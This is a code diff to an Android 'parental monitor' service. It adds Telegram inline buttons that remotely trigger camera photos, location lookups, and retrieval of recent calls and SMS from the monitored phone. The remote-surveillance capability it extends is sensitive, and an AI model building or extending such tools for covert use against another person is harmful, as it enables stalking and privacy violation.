@@ -205,12 +205,59 @@ class MonitoringService : Service() {
             if (update.updateId > preferencesManager.lastUpdateId) {
                 preferencesManager.lastUpdateId = update.updateId
             }
+            update.callbackQuery?.let {
+                handleCallbackQuery(it)
+                return@let
+            }
             val message = update.message ?: continue
             if (message.chat.id.toString() != chatId) continue
             val raw = message.text?.trim()?.substringBefore("@")?.lowercase() ?: continue
             if (!raw.startsWith("/")) continue
             handleTelegramCommand(raw)
         }
+    }
+
+    private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
+        val sender = query.message?.chat?.id?.toString() ?: return
+        if (sender != preferencesManager.chatId) return
+        answerCallback(query.id)
+        val command = when (query.data) {
+            "photo" -> "/photo"
+            "location" -> "/location"
+            "lastcalls" -> "/lastcalls"
+            "lastsms" -> "/lastsms"
+            "battery" -> "/battery"
+            "status" -> "/status"
+            "stop" -> "/stop"
+            "resume" -> "/resume"
+            "camfront" -> "/camera depan"
+            "camback" -> "/camera belakang"
+            "pause60" -> "/pause 60"
+            else -> return
+        }
+        handleTelegramCommand(command)
+    }
+
+    private suspend fun answerCallback(callbackId: String) {
+        try {
+            val url = "https://api.telegram.org/bot${preferencesManager.botToken}/answerCallbackQuery"
+            TelegramClient.api.answerCallbackQuery(url, mapOf("callback_query_id" to callbackId))
+        } catch (_: Exception) {
+        }
+    }
+
+    private fun mainMenu(): com.redeye.parentalmonitor.network.InlineKeyboardMarkup {
+        fun button(text: String, data: String) =
+            com.redeye.parentalmonitor.network.InlineButton(text, data)
+        return com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
+            listOf(
+                listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDCCD Lokasi", "location")),
+                listOf(button("\uD83D\uDCDE Panggilan", "lastcalls"), button("\uD83D\uDCAC SMS", "lastsms")),
+                listOf(button("\uD83D\uDCF7 Depan", "camfront"), button("\uD83D\uDCF7 Belakang", "camback")),
+                listOf(button("⏸️ Jeda 60 mnt", "pause60"), button("▶️ Lanjut", "resume")),
+                listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\uD83D\uDCCA Status", "status"))
+            )
+        )
     }
 
     private suspend fun handleTelegramCommand(raw: String) {
@@ -333,6 +380,8 @@ class MonitoringService : Service() {
             "/help", "/start" -> {
                 sendToTelegram(
                     buildString {
+                        appendLine("👆 <b>Tap a button below</b>")
+                        appendLine()
                         appendLine("🤖 <b>Commands</b>")
                         appendLine("/photo - take a photo now")
                         appendLine("/camera \u003cdepan|belakang\u003e - switch camera")
@@ -346,7 +395,8 @@ class MonitoringService : Service() {
                         appendLine("/stop - pause monitoring")
                         appendLine("/resume - resume monitoring")
                         appendLine("/help - show this list")
-                    }
+                    },
+                    mainMenu()
                 )
             }
             else -> { /* ignore unknown input to avoid reply loops */ }
@@ -614,7 +664,10 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun sendToTelegram(message: String) {
+    private suspend fun sendToTelegram(
+        message: String,
+        replyMarkup: com.redeye.parentalmonitor.network.InlineKeyboardMarkup? = null
+    ) {
         try {
             // Validate message length (Telegram max: 4096)
             if (message.length > 4096) {
@@ -647,7 +700,8 @@ class MonitoringService : Service() {
             val telegramMessage = TelegramMessage(
                 chatId = chatId,
                 text = message,
-                parseMode = "HTML"
+                parseMode = "HTML",
+                replyMarkup = replyMarkup
             )
 
             val url = "https://api.telegram.org/bot${botToken}/sendMessage"
